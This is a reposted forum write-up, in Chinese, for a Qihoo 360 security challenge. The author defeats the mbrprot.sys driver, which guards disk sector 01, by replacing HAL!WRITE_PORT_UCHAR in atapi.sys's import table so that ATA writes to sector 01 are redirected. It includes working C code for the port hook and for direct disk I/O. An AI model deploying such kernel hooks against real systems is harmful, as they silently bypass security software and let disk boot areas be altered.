
# 奇虎 360 第 1 题 hook WRITE_PORT_UCHAR

> 原文：[`www.pediy.com/kssd/pediy10/78975.html`](https://www.pediy.com/kssd/pediy10/78975.html)

懒得打字了，直接 copy 答案提交区的帖子吧，有什么不好的不要笑俺，俺是初学

由于里面废话太多，大概内容为：`mbrprot.sys` 会定时检查 `01` 号扇区，发现不对就清 0。我的方法是 阻止 `mbrprot.sys` 清 0，通过 hook `HAL!WRITE_PORT_UCHAR`，控制对硬盘端口的访问 使得任何 利用 `atapi.sys` 访问 `01` 扇区的方法都无效。

我的看法是其实 这题是要我们写一个 驱动来保护 `01` 号扇区， 这题太**了

## 第一题解题报告

### 一、分析

刚开始我认为解这题的方法很简单，不管三七二十一直接 io 端口读写硬盘，然后解题完毕。压根不用管

`mbrprot.sys` 如何工作的，因为 `mbrprot.sys` 很难拦截 io 操作，难到几乎不可能。

代码写出来的时候我很高兴，因为在虚拟机(xp)上成功了，然而其实并没有，当我在真机子(2003)上运行时,失败了...。这要批评一下 `mbrprot.sys` 的稳定性了， `mbrprot.sys` 老是 无缘罢工，而且貌似在 xp 下有点问题。走题了，不好意思...。

经我观察 `mbrprot.sys` 并没有保护 硬盘的 1 号扇区，而是一味的向 1 号 扇区写入 0。用 `softice` 设这样的断点 `bpio 1f7 w` 我发现（没弄错的话） `mbrprot.sys` 每隔一段时间(约 5s)检查 1 号扇区。 同时我也发现 系统只有 `atapi.sys` 访问了硬盘， 也就是说 `mbrprot.sys` 是利用 `atapi.sys` 访问硬盘的，并非直接 io 之类的。 那么现在的任务就很清楚了：只要阻止 `mbrprot.sys` 往 01 号写入 0 就可以了 (出这道题的用意也清楚了，嘿嘿 )。

怎么阻止 ？ hook `atapi.sys` 的派遣函数吧 ，不过我第一时间想到的方法 说不定出题的人也早就想到了... 。通过 跟踪断点 `bpio 1f7 w` ，我发现 `atapi.sys` 是通过 `HAL!WRITE_PORT_UCHAR` 向硬盘的寄存器写数据的,如果 hook 掉 `HAL!WRITE_PORT_UCHAR` ，将 `atapi.sys` 向 硬盘写入的数据过滤掉，那么...

但这方法是否可行呢，不用理论证明，因为我已经实践证明了。通过 hook 掉 `HAL!WRITE_PORT_UCHAR` 向 `atapi.sys` 提供一个虚假的硬件，拦截向真实硬盘发送的数据。其实该方法之所以可行完全依赖于 当向硬盘写入 扇区号，磁道号，磁头号 等等时 ，硬盘不会有任何反应，所以把这些数据拦截下来 延迟发送才不会出错。

### 二、我的实现方法

由于在虚拟机上 `mbrprot.sys` 老是罢工，因此我只能在真机上进行了（不知道评委能不能看在 我蓝屏了无数次，mbr 被写坏了一次 的份上给俺多加几分呢...）。由于是在自己的机子上试，为了减小程序出错时的严重性 我决定 只 hook `atapi.sys` 的 IAT(导入地址表)，又因为 `HAL!WRITE_PORT_UCHAR` 这个函数本身就只有几个指令，不用 hook 直接替换就可以了。

总的来说，程序只有两步：1、直接 io 向硬盘 01 扇区写入 数据；2、替换 `atapi.sys` IAT 中的 `HAL!WRITE_PORT_UCHAR` 为自己的 `write_port` 。

### 三、关键代码 （`write_port` 的代码）

放血了，有点痛，评委加点分鼓励一下吧。

1、直接 io 向硬盘 01 扇区写入 数据 的代码 网上到处都有。

2、hook 驱动导入表的代码 ，`rootkit.com` 上有， 看雪里面也有人（`sysnap`）发过 ，我是学习了他的一部分（发扬了大学生的借鉴风格）

3、`write_port` 完全原创 （如果要“**借鉴**”请申明以下出处：**zdg102**）

申明：`write_port` 完全没有考虑 `lba48` 的情况（本人没有 160G 的硬盘），`lba48` 下无法正常工作

```c
#define REG_CMD_BASE0  0x1F0

#define REG_DATA      0  /*数据寄存器*/  

#define REG_PRECOMP      1  
#define REG_COUNT      2  /*扇区数*/  
#define REG_SECTOR      3  /*扇区号 */  
#define REG_CYL_LO      4  /*  */  
#define REG_CYL_HI      5  /*  */  
#define REG_LDH        6  /*  */  
#define  CMD_WRITE    0x30  /* 写数据 */  
#define    CMD_WRITE_EXT    0x34  /*/ */
```

```c
void out_b(uint port,uint v)
//写端口函数
{
  __asm{
    mov  edx,port;
    mov  eax,v;
    out  dx,al;
  }
}
```

```c
int send_cmd(unsigned char p[],unsigned char cmd,unsigned int mask)
/*向硬盘发送命令，
p 数组是个寄存器的内容，cmd 是命令，mask 说明 p 中那些内容是有效的。
*/
{
/*author: zdg102 */  
  unsigned char i;
  unsigned int j;
  for(i = 1,j=0;(i&0xff)>0;i<<=1,j++)
  {
    if(mask & i)
      out_b(REG_CMD_BASE0+j ,p[j]);
  }
  out_b(REG_CMD_BASE0 + REG_COMMAND, cmd);
  return 1;
}
```

```c
unsigned char at_rig[8]={0,0,0,0,0,0,0,0}; /*保存 atapi.sys 向硬盘写入的数据*/  
unsigned int rig_mask = 0;                  /*保存 atapi.sys 向硬盘哪些寄存器写入了数据*/  
void __stdcall write_port(unsigned int port,unsigned int value)
/*  用来替换 WRITE_PORT_UCHAR  的函数
*/
{
  /*author: zdg102 */  
  port &=0xffff;
  value &= 0xff;
/*判断要写入的端口是否在 硬盘的端口范围之内*/  
  if( port> REG_CMD_BASE0 && port <= REG_CMD_BASE0+ 7)  
  {
    //判断是否是 控制命令  
    if(port == (REG_CMD_BASE0+REG_COMMAND))
    {
      // 判断是否是 写入命令  
      if(value == CMD_WRITE || value == CMD_WRITE_EXT || value == 0xca || value  
== 0x35)
      {
        //判断 是否写入 01 号 扇区  
        if((at_rig[REG_CYL_HI] == 0)&&(at_rig[REG_CYL_LO] == 0) &&  
(at_rig[REG_SECTOR] == 1) && ((at_rig[REG_LDH]&0x10) == 0))
        {
          at_rig[REG_SECTOR] = 2;  
          /*改为 2 号 扇区，应该可以成一个不存在扇区，但我不敢在  
          自己机子上试 */
        }
      }
      //向真实硬盘 发送命令  
      send_cmd(at_rig,value,rig_mask);  
      rig_mask = 0;
      return ;
    }
    else
    {
      at_rig[port-REG_CMD_BASE0] = value;
      if(port == (REG_CMD_BASE0 + REG_LDH) )
        out_b(port,value);
      else
        rig_mask |= (1<<(port-REG_CMD_BASE0));
      return ;
    }
    return ;
  }
  else
  {
    out_b(port,value);
    return ;
  }
}
```

加载 `MadeByZDG.sys` 后，所有 向 01 号 扇区写入的数据 都将被 转道 02 号 扇区。

可以用 `winhex` 试一下，很有意思的。

其实现 在 `atapi.sys` 还要往下一层。因此 什么 直接 `irp` 、 `ioctrl` 之类的 都无效，希望大家可以帮我多测一下

有个问题没有考虑的就是 ：向 0 号扇区写入的数据 不会被 过滤，因此 如果向 0 号扇区写入 2 个扇区的数据 应该.....

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `zdg102.rar` |
